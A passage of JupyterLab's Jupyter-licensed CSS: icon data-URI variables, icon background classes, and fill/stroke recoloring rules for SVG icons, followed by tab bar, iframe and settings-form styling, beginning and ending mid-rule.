wLjEwMy0wLjQ1MiAwLTAuNjkzLTAuMjItMC4yMzEtMC4yLTAuMjg0LTAuNjYyLTAuOTU2IDAuODcyLTIgMC44NzItMC45MDMgMC0xLjQ3LTAuNDcyLTAuNTI1LTAuNDcyLTAuNTI1LTEuMjYgMC0wLjI2MiAwLjA0NTItMC40NzIgMC4wNTY3LTAuMjIgMC4xMTYtMC4zNzggMC4wNjgyLTAuMTY4IDAuMjMxLTAuMzA0IDAuMTU4LTAuMTQ3IDAuMjYyLTAuMjQyIDAuMTE2LTAuMDkxNCAwLjM2OC0wLjE2OCAwLjI2Mi0wLjA5MTQgMC4zOTktMC4xMjYgMC4xMzYtMC4wNDUyIDAuNDcyLTAuMTAzIDAuMzM2LTAuMDU3OCAwLjUwNC0wLjA3OTggMC4xNTgtMC4wMjMxIDAuNTY3LTAuMDc5OCAwLjU1Ni0wLjA2ODIgMC43NzctMC4yMjEgMC4yMi0wLjE1MiAwLjIyLTAuNDQxdi0wLjI1MnEwLTAuNDMtMC4zNTctMC42NjItMC4zMzYtMC4yMzEtMC45NzYtMC4yMzEtMC42NjIgMC0wLjk5OCAwLjI2Mi0wLjMzNiAwLjI1Mi0wLjM5OSAwLjc5OHptMS44OSAzLjY4cTAuNzg4IDAgMS4yNi0wLjQxIDAuNTA0LTAuNDIgMC41MDQtMC45MDN2LTEuMDVxLTAuMjg0IDAuMTM2LTAuODYxIDAuMjMxLTAuNTY3IDAuMDkxNC0wLjk4NyAwLjE1OC0wLjQyIDAuMDY4Mi0wLjc2NiAwLjMyNi0wLjMzNiAwLjI1Mi0wLjMzNiAwLjcwNHQwLjMwNCAwLjcwNCAwLjg2MSAwLjI1MnoiIHN0cm9rZS13aWR0aD0iMS4wNSIvPgogIDxwYXRoIGQ9Im0xMCA0LjU2aDAuOTQ1djMuMTVxMC42NTEtMC45NzYgMS44OS0wLjk3NiAxLjE2IDAgMS44OSAwLjg0IDAuNjgyIDAuODQgMC42ODIgMi4zMSAwIDEuNDctMC43MDQgMi40Mi0wLjcwNCAwLjg4Mi0xLjg5IDAuODgyLTEuMjYgMC0xLjg5LTEuMDJ2MC43NjZoLTAuODV6bTIuNjIgMy4wNHEtMC43NDYgMC0xLjE2IDAuNjQtMC40NTIgMC42My0wLjQ1MiAxLjY4IDAgMS4wNSAwLjQ1MiAxLjY4dDEuMTYgMC42M3EwLjc3NyAwIDEuMjYtMC42MyAwLjQ5NC0wLjY0IDAuNDk0LTEuNjggMC0xLjA1LTAuNDcyLTEuNjgtMC40NjItMC42NC0xLjI2LTAuNjR6IiBzdHJva2Utd2lkdGg9IjEuMDUiLz4KICA8cGF0aCBkPSJtMi43MyAxNS44IDEzLjYgMC4wMDgxYzAuMDA2OSAwIDAtMi42IDAtMi42IDAtMC4wMDc4LTEuMTUgMC0xLjE1IDAtMC4wMDY5IDAtMC4wMDgzIDEuNS0wLjAwODMgMS41LTJlLTMgLTAuMDAxNC0xMS4zLTAuMDAxNC0xMS4zLTAuMDAxNGwtMC4wMDU5Mi0xLjVjMC0wLjAwNzgtMS4xNyAwLjAwMTMtMS4xNyAwLjAwMTN6IiBzdHJva2Utd2lkdGg9Ii45NzUiLz4KIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-yaml: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8ZyBjbGFzcz0ianAtaWNvbi1jb250cmFzdDIganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjRDgxQjYwIj4KICAgIDxwYXRoIGQ9Ik03LjIgMTguNnYtNS40TDMgNS42aDMuM2wxLjQgMy4xYy4zLjkuNiAxLjYgMSAyLjUuMy0uOC42LTEuNiAxLTIuNWwxLjQtMy4xaDMuNGwtNC40IDcuNnY1LjVsLTIuOS0uMXoiLz4KICAgIDxjaXJjbGUgY2xhc3M9InN0MCIgY3g9IjE3LjYiIGN5PSIxNi41IiByPSIyLjEiLz4KICAgIDxjaXJjbGUgY2xhc3M9InN0MCIgY3g9IjE3LjYiIGN5PSIxMSIgcj0iMi4xIi8+CiAgPC9nPgo8L3N2Zz4K);
}

/* Icon CSS class declarations */

.jp-AddAboveIcon {
  background-image: var(--jp-icon-add-above);
}

.jp-AddBelowIcon {
  background-image: var(--jp-icon-add-below);
}

.jp-AddIcon {
  background-image: var(--jp-icon-add);
}

.jp-BellIcon {
  background-image: var(--jp-icon-bell);
}

.jp-BugDotIcon {
  background-image: var(--jp-icon-bug-dot);
}

.jp-BugIcon {
  background-image: var(--jp-icon-bug);
}

.jp-BuildIcon {
  background-image: var(--jp-icon-build);
}

.jp-CaretDownEmptyIcon {
  background-image: var(--jp-icon-caret-down-empty);
}

.jp-CaretDownEmptyThinIcon {
  background-image: var(--jp-icon-caret-down-empty-thin);
}

.jp-CaretDownIcon {
  background-image: var(--jp-icon-caret-down);
}

.jp-CaretLeftIcon {
  background-image: var(--jp-icon-caret-left);
}

.jp-CaretRightIcon {
  background-image: var(--jp-icon-caret-right);
}

.jp-CaretUpEmptyThinIcon {
  background-image: var(--jp-icon-caret-up-empty-thin);
}

.jp-CaretUpIcon {
  background-image: var(--jp-icon-caret-up);
}

.jp-CaseSensitiveIcon {
  background-image: var(--jp-icon-case-sensitive);
}

.jp-CheckIcon {
  background-image: var(--jp-icon-check);
}

.jp-CircleEmptyIcon {
  background-image: var(--jp-icon-circle-empty);
}

.jp-CircleIcon {
  background-image: var(--jp-icon-circle);
}

.jp-ClearIcon {
  background-image: var(--jp-icon-clear);
}

.jp-CloseIcon {
  background-image: var(--jp-icon-close);
}

.jp-CodeCheckIcon {
  background-image: var(--jp-icon-code-check);
}

.jp-CodeIcon {
  background-image: var(--jp-icon-code);
}

.jp-CollapseAllIcon {
  background-image: var(--jp-icon-collapse-all);
}

.jp-ConsoleIcon {
  background-image: var(--jp-icon-console);
}

.jp-CopyIcon {
  background-image: var(--jp-icon-copy);
}

.jp-CopyrightIcon {
  background-image: var(--jp-icon-copyright);
}

.jp-CutIcon {
  background-image: var(--jp-icon-cut);
}

.jp-DeleteIcon {
  background-image: var(--jp-icon-delete);
}

.jp-DownloadIcon {
  background-image: var(--jp-icon-download);
}

.jp-DuplicateIcon {
  background-image: var(--jp-icon-duplicate);
}

.jp-EditIcon {
  background-image: var(--jp-icon-edit);
}

.jp-EllipsesIcon {
  background-image: var(--jp-icon-ellipses);
}

.jp-ErrorIcon {
  background-image: var(--jp-icon-error);
}

.jp-ExpandAllIcon {
  background-image: var(--jp-icon-expand-all);
}

.jp-ExtensionIcon {
  background-image: var(--jp-icon-extension);
}

.jp-FastForwardIcon {
  background-image: var(--jp-icon-fast-forward);
}

.jp-FileIcon {
  background-image: var(--jp-icon-file);
}

.jp-FileUploadIcon {
  background-image: var(--jp-icon-file-upload);
}

.jp-FilterDotIcon {
  background-image: var(--jp-icon-filter-dot);
}

.jp-FilterIcon {
  background-image: var(--jp-icon-filter);
}

.jp-FilterListIcon {
  background-image: var(--jp-icon-filter-list);
}

.jp-FolderFavoriteIcon {
  background-image: var(--jp-icon-folder-favorite);
}

.jp-FolderIcon {
  background-image: var(--jp-icon-folder);
}

.jp-HomeIcon {
  background-image: var(--jp-icon-home);
}

.jp-Html5Icon {
  background-image: var(--jp-icon-html5);
}

.jp-ImageIcon {
  background-image: var(--jp-icon-image);
}

.jp-InfoIcon {
  background-image: var(--jp-icon-info);
}

.jp-InspectorIcon {
  background-image: var(--jp-icon-inspector);
}

.jp-JsonIcon {
  background-image: var(--jp-icon-json);
}

.jp-JuliaIcon {
  background-image: var(--jp-icon-julia);
}

.jp-JupyterFaviconIcon {
  background-image: var(--jp-icon-jupyter-favicon);
}

.jp-JupyterIcon {
  background-image: var(--jp-icon-jupyter);
}

.jp-JupyterlabWordmarkIcon {
  background-image: var(--jp-icon-jupyterlab-wordmark);
}

.jp-KernelIcon {
  background-image: var(--jp-icon-kernel);
}

.jp-KeyboardIcon {
  background-image: var(--jp-icon-keyboard);
}

.jp-LaunchIcon {
  background-image: var(--jp-icon-launch);
}

.jp-LauncherIcon {
  background-image: var(--jp-icon-launcher);
}

.jp-LineFormIcon {
  background-image: var(--jp-icon-line-form);
}

.jp-LinkIcon {
  background-image: var(--jp-icon-link);
}

.jp-ListIcon {
  background-image: var(--jp-icon-list);
}

.jp-MarkdownIcon {
  background-image: var(--jp-icon-markdown);
}

.jp-MoveDownIcon {
  background-image: var(--jp-icon-move-down);
}

.jp-MoveUpIcon {
  background-image: var(--jp-icon-move-up);
}

.jp-NewFolderIcon {
  background-image: var(--jp-icon-new-folder);
}

.jp-NotTrustedIcon {
  background-image: var(--jp-icon-not-trusted);
}

.jp-NotebookIcon {
  background-image: var(--jp-icon-notebook);
}

.jp-NumberingIcon {
  background-image: var(--jp-icon-numbering);
}

.jp-OfflineBoltIcon {
  background-image: var(--jp-icon-offline-bolt);
}

.jp-PaletteIcon {
  background-image: var(--jp-icon-palette);
}

.jp-PasteIcon {
  background-image: var(--jp-icon-paste);
}

.jp-PdfIcon {
  background-image: var(--jp-icon-pdf);
}

.jp-PythonIcon {
  background-image: var(--jp-icon-python);
}

.jp-RKernelIcon {
  background-image: var(--jp-icon-r-kernel);
}

.jp-ReactIcon {
  background-image: var(--jp-icon-react);
}

.jp-RedoIcon {
  background-image: var(--jp-icon-redo);
}

.jp-RefreshIcon {
  background-image: var(--jp-icon-refresh);
}

.jp-RegexIcon {
  background-image: var(--jp-icon-regex);
}

.jp-RunIcon {
  background-image: var(--jp-icon-run);
}

.jp-RunningIcon {
  background-image: var(--jp-icon-running);
}

.jp-SaveIcon {
  background-image: var(--jp-icon-save);
}

.jp-SearchIcon {
  background-image: var(--jp-icon-search);
}

.jp-SettingsIcon {
  background-image: var(--jp-icon-settings);
}

.jp-ShareIcon {
  background-image: var(--jp-icon-share);
}

.jp-SpreadsheetIcon {
  background-image: var(--jp-icon-spreadsheet);
}

.jp-StopIcon {
  background-image: var(--jp-icon-stop);
}

.jp-TabIcon {
  background-image: var(--jp-icon-tab);
}

.jp-TableRowsIcon {
  background-image: var(--jp-icon-table-rows);
}

.jp-TagIcon {
  background-image: var(--jp-icon-tag);
}

.jp-TerminalIcon {
  background-image: var(--jp-icon-terminal);
}

.jp-TextEditorIcon {
  background-image: var(--jp-icon-text-editor);
}

.jp-TocIcon {
  background-image: var(--jp-icon-toc);
}

.jp-TreeViewIcon {
  background-image: var(--jp-icon-tree-view);
}

.jp-TrustedIcon {
  background-image: var(--jp-icon-trusted);
}

.jp-UndoIcon {
  background-image: var(--jp-icon-undo);
}

.jp-UserIcon {
  background-image: var(--jp-icon-user);
}

.jp-UsersIcon {
  background-image: var(--jp-icon-users);
}

.jp-VegaIcon {
  background-image: var(--jp-icon-vega);
}

.jp-WordIcon {
  background-image: var(--jp-icon-word);
}

.jp-YamlIcon {
  background-image: var(--jp-icon-yaml);
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/**
 * (DEPRECATED) Support for consuming icons as CSS background images
 */

.jp-Icon,
.jp-MaterialIcon {
  background-position: center;
  background-repeat: no-repeat;
  background-size: 16px;
  min-width: 16px;
  min-height: 16px;
}

.jp-Icon-cover {
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}

/**
 * (DEPRECATED) Support for specific CSS icon sizes
 */

.jp-Icon-16 {
  background-size: 16px;
  min-width: 16px;
  min-height: 16px;
}

.jp-Icon-18 {
  background-size: 18px;
  min-width: 18px;
  min-height: 18px;
}

.jp-Icon-20 {
  background-size: 20px;
  min-width: 20px;
  min-height: 20px;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.lm-TabBar .lm-TabBar-addButton {
  align-items: center;
  display: flex;
  padding: 4px;
  padding-bottom: 5px;
  margin-right: 1px;
  background-color: var(--jp-layout-color2);
}

.lm-TabBar .lm-TabBar-addButton:hover {
  background-color: var(--jp-layout-color1);
}

.lm-DockPanel-tabBar .lm-TabBar-tab {
  width: var(--jp-private-horizontal-tab-width);
}

.lm-DockPanel-tabBar .lm-TabBar-content {
  flex: unset;
}

.lm-DockPanel-tabBar[data-orientation='horizontal'] {
  flex: 1 1 auto;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/**
 * Support for icons as inline SVG HTMLElements
 */

/* recolor the primary elements of an icon */
.jp-icon0[fill] {
  fill: var(--jp-inverse-layout-color0);
}

.jp-icon1[fill] {
  fill: var(--jp-inverse-layout-color1);
}

.jp-icon2[fill] {
  fill: var(--jp-inverse-layout-color2);
}

.jp-icon3[fill] {
  fill: var(--jp-inverse-layout-color3);
}

.jp-icon4[fill] {
  fill: var(--jp-inverse-layout-color4);
}

.jp-icon0[stroke] {
  stroke: var(--jp-inverse-layout-color0);
}

.jp-icon1[stroke] {
  stroke: var(--jp-inverse-layout-color1);
}

.jp-icon2[stroke] {
  stroke: var(--jp-inverse-layout-color2);
}

.jp-icon3[stroke] {
  stroke: var(--jp-inverse-layout-color3);
}

.jp-icon4[stroke] {
  stroke: var(--jp-inverse-layout-color4);
}

/* recolor the accent elements of an icon */
.jp-icon-accent0[fill] {
  fill: var(--jp-layout-color0);
}

.jp-icon-accent1[fill] {
  fill: var(--jp-layout-color1);
}

.jp-icon-accent2[fill] {
  fill: var(--jp-layout-color2);
}

.jp-icon-accent3[fill] {
  fill: var(--jp-layout-color3);
}

.jp-icon-accent4[fill] {
  fill: var(--jp-layout-color4);
}

.jp-icon-accent0[stroke] {
  stroke: var(--jp-layout-color0);
}

.jp-icon-accent1[stroke] {
  stroke: var(--jp-layout-color1);
}

.jp-icon-accent2[stroke] {
  stroke: var(--jp-layout-color2);
}

.jp-icon-accent3[stroke] {
  stroke: var(--jp-layout-color3);
}

.jp-icon-accent4[stroke] {
  stroke: var(--jp-layout-color4);
}

/* set the color of an icon to transparent */
.jp-icon-none[fill] {
  fill: none;
}

.jp-icon-none[stroke] {
  stroke: none;
}

/* brand icon colors. Same for light and dark */
.jp-icon-brand0[fill] {
  fill: var(--jp-brand-color0);
}

.jp-icon-brand1[fill] {
  fill: var(--jp-brand-color1);
}

.jp-icon-brand2[fill] {
  fill: var(--jp-brand-color2);
}

.jp-icon-brand3[fill] {
  fill: var(--jp-brand-color3);
}

.jp-icon-brand4[fill] {
  fill: var(--jp-brand-color4);
}

.jp-icon-brand0[stroke] {
  stroke: var(--jp-brand-color0);
}

.jp-icon-brand1[stroke] {
  stroke: var(--jp-brand-color1);
}

.jp-icon-brand2[stroke] {
  stroke: var(--jp-brand-color2);
}

.jp-icon-brand3[stroke] {
  stroke: var(--jp-brand-color3);
}

.jp-icon-brand4[stroke] {
  stroke: var(--jp-brand-color4);
}

/* warn icon colors. Same for light and dark */
.jp-icon-warn0[fill] {
  fill: var(--jp-warn-color0);
}

.jp-icon-warn1[fill] {
  fill: var(--jp-warn-color1);
}

.jp-icon-warn2[fill] {
  fill: var(--jp-warn-color2);
}

.jp-icon-warn3[fill] {
  fill: var(--jp-warn-color3);
}

.jp-icon-warn0[stroke] {
  stroke: var(--jp-warn-color0);
}

.jp-icon-warn1[stroke] {
  stroke: var(--jp-warn-color1);
}

.jp-icon-warn2[stroke] {
  stroke: var(--jp-warn-color2);
}

.jp-icon-warn3[stroke] {
  stroke: var(--jp-warn-color3);
}

/* icon colors that contrast well with each other and most backgrounds */
.jp-icon-contrast0[fill] {
  fill: var(--jp-icon-contrast-color0);
}

.jp-icon-contrast1[fill] {
  fill: var(--jp-icon-contrast-color1);
}

.jp-icon-contrast2[fill] {
  fill: var(--jp-icon-contrast-color2);
}

.jp-icon-contrast3[fill] {
  fill: var(--jp-icon-contrast-color3);
}

.jp-icon-contrast0[stroke] {
  stroke: var(--jp-icon-contrast-color0);
}

.jp-icon-contrast1[stroke] {
  stroke: var(--jp-icon-contrast-color1);
}

.jp-icon-contrast2[stroke] {
  stroke: var(--jp-icon-contrast-color2);
}

.jp-icon-contrast3[stroke] {
  stroke: var(--jp-icon-contrast-color3);
}

.jp-icon-dot[fill] {
  fill: var(--jp-warn-color0);
}

.jp-jupyter-icon-color[fill] {
  fill: var(--jp-jupyter-icon-color, var(--jp-warn-color0));
}

.jp-notebook-icon-color[fill] {
  fill: var(--jp-notebook-icon-color, var(--jp-warn-color0));
}

.jp-json-icon-color[fill] {
  fill: var(--jp-json-icon-color, var(--jp-warn-color1));
}

.jp-console-icon-color[fill] {
  fill: var(--jp-console-icon-color, white);
}

.jp-console-icon-background-color[fill] {
  fill: var(--jp-console-icon-background-color, var(--jp-brand-color1));
}

.jp-terminal-icon-color[fill] {
  fill: var(--jp-terminal-icon-color, var(--jp-layout-color2));
}

.jp-terminal-icon-background-color[fill] {
  fill: var(
    --jp-terminal-icon-background-color,
    var(--jp-inverse-layout-color2)
  );
}

.jp-text-editor-icon-color[fill] {
  fill: var(--jp-text-editor-icon-color, var(--jp-inverse-layout-color3));
}

.jp-inspector-icon-color[fill] {
  fill: var(--jp-inspector-icon-color, var(--jp-inverse-layout-color3));
}

/* CSS for icons in selected filebrowser listing items */
.jp-DirListing-item.jp-mod-selected .jp-icon-selectable[fill] {
  fill: #fff;
}

.jp-DirListing-item.jp-mod-selected .jp-icon-selectable-inverse[fill] {
  fill: var(--jp-brand-color1);
}

/* stylelint-disable selector-max-class, selector-max-compound-selectors */

/**
* TODO: come up with non css-hack solution for showing the busy icon on top
*  of the close icon
* CSS for complex behavior of close icon of tabs in the main area tabbar
*/
.lm-DockPanel-tabBar
  .lm-TabBar-tab.lm-mod-closable.jp-mod-dirty
  > .lm-TabBar-tabCloseIcon
  > :not(:hover)
  > .jp-icon3[fill] {
  fill: none;
}

.lm-DockPanel-tabBar
  .lm-TabBar-tab.lm-mod-closable.jp-mod-dirty
  > .lm-TabBar-tabCloseIcon
  > :not(:hover)
  > .jp-icon-busy[fill] {
  fill: var(--jp-inverse-layout-color3);
}

/* stylelint-enable selector-max-class, selector-max-compound-selectors */

/* CSS for icons in status bar */
#jp-main-statusbar .jp-mod-selected .jp-icon-selectable[fill] {
  fill: #fff;
}

#jp-main-statusbar .jp-mod-selected .jp-icon-selectable-inverse[fill] {
  fill: var(--jp-brand-color1);
}

/* special handling for splash icon CSS. While the theme CSS reloads during
   splash, the splash icon can loose theming. To prevent that, we set a
   default for its color variable */
:root {
  --jp-warn-color0: var(--md-orange-700);
}

/* not sure what to do with this one, used in filebrowser listing */
.jp-DragIcon {
  margin-right: 4px;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/**
 * Support for alt colors for icons as inline SVG HTMLElements
 */

/* alt recolor the primary elements of an icon */
.jp-icon-alt .jp-icon0[fill] {
  fill: var(--jp-layout-color0);
}

.jp-icon-alt .jp-icon1[fill] {
  fill: var(--jp-layout-color1);
}

.jp-icon-alt .jp-icon2[fill] {
  fill: var(--jp-layout-color2);
}

.jp-icon-alt .jp-icon3[fill] {
  fill: var(--jp-layout-color3);
}

.jp-icon-alt .jp-icon4[fill] {
  fill: var(--jp-layout-color4);
}

.jp-icon-alt .jp-icon0[stroke] {
  stroke: var(--jp-layout-color0);
}

.jp-icon-alt .jp-icon1[stroke] {
  stroke: var(--jp-layout-color1);
}

.jp-icon-alt .jp-icon2[stroke] {
  stroke: var(--jp-layout-color2);
}

.jp-icon-alt .jp-icon3[stroke] {
  stroke: var(--jp-layout-color3);
}

.jp-icon-alt .jp-icon4[stroke] {
  stroke: var(--jp-layout-color4);
}

/* alt recolor the accent elements of an icon */
.jp-icon-alt .jp-icon-accent0[fill] {
  fill: var(--jp-inverse-layout-color0);
}

.jp-icon-alt .jp-icon-accent1[fill] {
  fill: var(--jp-inverse-layout-color1);
}

.jp-icon-alt .jp-icon-accent2[fill] {
  fill: var(--jp-inverse-layout-color2);
}

.jp-icon-alt .jp-icon-accent3[fill] {
  fill: var(--jp-inverse-layout-color3);
}

.jp-icon-alt .jp-icon-accent4[fill] {
  fill: var(--jp-inverse-layout-color4);
}

.jp-icon-alt .jp-icon-accent0[stroke] {
  stroke: var(--jp-inverse-layout-color0);
}

.jp-icon-alt .jp-icon-accent1[stroke] {
  stroke: var(--jp-inverse-layout-color1);
}

.jp-icon-alt .jp-icon-accent2[stroke] {
  stroke: var(--jp-inverse-layout-color2);
}

.jp-icon-alt .jp-icon-accent3[stroke] {
  stroke: var(--jp-inverse-layout-color3);
}

.jp-icon-alt .jp-icon-accent4[stroke] {
  stroke: var(--jp-inverse-layout-color4);
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-icon-hoverShow:not(:hover) .jp-icon-hoverShow-content {
  display: none !important;
}

/**
 * Support for hover colors for icons as inline SVG HTMLElements
 */

/**
 * regular colors
 */

/* recolor the primary elements of an icon */
.jp-icon-hover :hover .jp-icon0-hover[fill] {
  fill: var(--jp-inverse-layout-color0);
}

.jp-icon-hover :hover .jp-icon1-hover[fill] {
  fill: var(--jp-inverse-layout-color1);
}

.jp-icon-hover :hover .jp-icon2-hover[fill] {
  fill: var(--jp-inverse-layout-color2);
}

.jp-icon-hover :hover .jp-icon3-hover[fill] {
  fill: var(--jp-inverse-layout-color3);
}

.jp-icon-hover :hover .jp-icon4-hover[fill] {
  fill: var(--jp-inverse-layout-color4);
}

.jp-icon-hover :hover .jp-icon0-hover[stroke] {
  stroke: var(--jp-inverse-layout-color0);
}

.jp-icon-hover :hover .jp-icon1-hover[stroke] {
  stroke: var(--jp-inverse-layout-color1);
}

.jp-icon-hover :hover .jp-icon2-hover[stroke] {
  stroke: var(--jp-inverse-layout-color2);
}

.jp-icon-hover :hover .jp-icon3-hover[stroke] {
  stroke: var(--jp-inverse-layout-color3);
}

.jp-icon-hover :hover .jp-icon4-hover[stroke] {
  stroke: var(--jp-inverse-layout-color4);
}

/* recolor the accent elements of an icon */
.jp-icon-hover :hover .jp-icon-accent0-hover[fill] {
  fill: var(--jp-layout-color0);
}

.jp-icon-hover :hover .jp-icon-accent1-hover[fill] {
  fill: var(--jp-layout-color1);
}

.jp-icon-hover :hover .jp-icon-accent2-hover[fill] {
  fill: var(--jp-layout-color2);
}

.jp-icon-hover :hover .jp-icon-accent3-hover[fill] {
  fill: var(--jp-layout-color3);
}

.jp-icon-hover :hover .jp-icon-accent4-hover[fill] {
  fill: var(--jp-layout-color4);
}

.jp-icon-hover :hover .jp-icon-accent0-hover[stroke] {
  stroke: var(--jp-layout-color0);
}

.jp-icon-hover :hover .jp-icon-accent1-hover[stroke] {
  stroke: var(--jp-layout-color1);
}

.jp-icon-hover :hover .jp-icon-accent2-hover[stroke] {
  stroke: var(--jp-layout-color2);
}

.jp-icon-hover :hover .jp-icon-accent3-hover[stroke] {
  stroke: var(--jp-layout-color3);
}

.jp-icon-hover :hover .jp-icon-accent4-hover[stroke] {
  stroke: var(--jp-layout-color4);
}

/* set the color of an icon to transparent */
.jp-icon-hover :hover .jp-icon-none-hover[fill] {
  fill: none;
}

.jp-icon-hover :hover .jp-icon-none-hover[stroke] {
  stroke: none;
}

/**
 * inverse colors
 */

/* inverse recolor the primary elements of an icon */
.jp-icon-hover.jp-icon-alt :hover .jp-icon0-hover[fill] {
  fill: var(--jp-layout-color0);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon1-hover[fill] {
  fill: var(--jp-layout-color1);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon2-hover[fill] {
  fill: var(--jp-layout-color2);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon3-hover[fill] {
  fill: var(--jp-layout-color3);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon4-hover[fill] {
  fill: var(--jp-layout-color4);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon0-hover[stroke] {
  stroke: var(--jp-layout-color0);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon1-hover[stroke] {
  stroke: var(--jp-layout-color1);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon2-hover[stroke] {
  stroke: var(--jp-layout-color2);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon3-hover[stroke] {
  stroke: var(--jp-layout-color3);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon4-hover[stroke] {
  stroke: var(--jp-layout-color4);
}

/* inverse recolor the accent elements of an icon */
.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent0-hover[fill] {
  fill: var(--jp-inverse-layout-color0);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent1-hover[fill] {
  fill: var(--jp-inverse-layout-color1);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent2-hover[fill] {
  fill: var(--jp-inverse-layout-color2);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent3-hover[fill] {
  fill: var(--jp-inverse-layout-color3);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent4-hover[fill] {
  fill: var(--jp-inverse-layout-color4);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent0-hover[stroke] {
  stroke: var(--jp-inverse-layout-color0);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent1-hover[stroke] {
  stroke: var(--jp-inverse-layout-color1);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent2-hover[stroke] {
  stroke: var(--jp-inverse-layout-color2);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent3-hover[stroke] {
  stroke: var(--jp-inverse-layout-color3);
}

.jp-icon-hover.jp-icon-alt :hover .jp-icon-accent4-hover[stroke] {
  stroke: var(--jp-inverse-layout-color4);
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-IFrame {
  width: 100%;
  height: 100%;
}

.jp-IFrame > iframe {
  border: none;
}

/*
When drag events occur, `lm-mod-override-cursor` is added to the body.
Because iframes steal all cursor events, the following two rules are necessary
to suppress pointer events while resize drags are occurring. There may be a
better solution to this problem.
*/
body.lm-mod-override-cursor .jp-IFrame {
  position: relative;
}

body.lm-mod-override-cursor .jp-IFrame::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: transparent;
}

/*-----------------------------------------------------------------------------
| Copyright (c) 2014-2016, Jupyter Development Team.
|
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-HoverBox {
  position: fixed;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-FormGroup-content fieldset {
  border: none;
  padding: 0;
  min-width: 0;
  width: 100%;
}

/* stylelint-disable selector-max-type */

.jp-FormGroup-content fieldset .jp-inputFieldWrapper input,
.jp-FormGroup-content fieldset .jp-inputFieldWrapper select,
.jp-FormGroup-content fieldset .jp-inputFieldWrapper textarea {
  font-size: var(--jp-content-font-size2);
  border-color: var(--jp-input-border-color);
  border-style: solid;
  border-radius: var(--jp-border-radius);
  border-width: 1px;
  padding: 6px 8px;
  background: none;
  color: var(--jp-ui-font-color0);
  height: inherit;
}

.jp-FormGroup-content fieldset input[type='checkbox'] {
  position: relative;
  top: 2px;
  margin-left: 0;
}

.jp-FormGroup-content button.jp-mod-styled {
  cursor: pointer;
}

.jp-FormGroup-content .checkbox label {
  cursor: pointer;
  font-size: var(--jp-content-font-size1);
}

.jp-FormGroup-content .jp-root > fieldset > legend {
  display: none;
}

.jp-FormGroup-content .jp-root > fieldset > p {
  display: none;
}

/** copy of `input.jp-mod-styled:focus` style */
.jp-FormGroup-content fieldset input:focus,
.jp-FormGroup-content fieldset select:focus {
  -moz-outline-radius: unset;
  outline: var(--jp-border-width) solid var(--md-blue-500);
  outline-offset: -1px;
  box-shadow: inset 0 0 4px var(--md-blue-300);
}

.jp-FormGroup-content fieldset input:hover:not(:focus),
.jp-FormGroup-content fieldset select:hover:not(:focus) {
  background-color: var(--jp-border-color2);
}

/* stylelint-enable selector-max-type */

.jp-FormGroup-content .checkbox .field-description {
  /* Disable default description field for checkbox:
   because other widgets do not have description fields,
   we add descriptions to each widget on the field level.
  */
  display: none;
}

.jp-FormGroup-content #root__description {
  display: none;
}

.jp-FormGroup-content .jp-modifiedIndicator {
  width: 5px;
  background-color: var(--jp-brand-color2);
  margin-top: 0;
  margin-left: calc(var(--jp-private-settingeditor-modifier-indent) * -1);
  flex-shrink: 0;
}

.jp-FormGroup-content .jp-modifiedIndicator.jp-errorIndicator {
  background-color: var(--jp-error-color0);
  margin-right: 0.5em;
}

/* RJSF ARRAY style */

.jp-arrayFieldWrapper legend {
  font-size: var(--jp-content-font-size2);
  color: var(--jp-ui-font-color0);
  flex-basis: 100%;
  padding: 4px 0;
  font-weight: var(--jp-content-heading-font-weight);
  border-bottom: 1px solid var(--jp-border-color2);
}

.jp-arrayFieldWrapper .field-description {
  padding: 4px 0;
  white-space: pre-wrap;
}

.jp-arrayFieldWrapper .array-item {
  width: 100%;
  border: 1px solid var(--jp-border-color2);
  border-radius: 4px;
  margin: 4px;
}

.jp-ArrayOperations {
  display: flex;
  margin-left: 8px;
}

.jp-ArrayOperationsButton {
  margin: 2px;
}

.jp-ArrayOperationsButton .jp-icon3[fill] {
  fill: var(--jp-ui-font-color0);
}

button.jp-ArrayOperationsButton.jp-mod-styled:disabled {
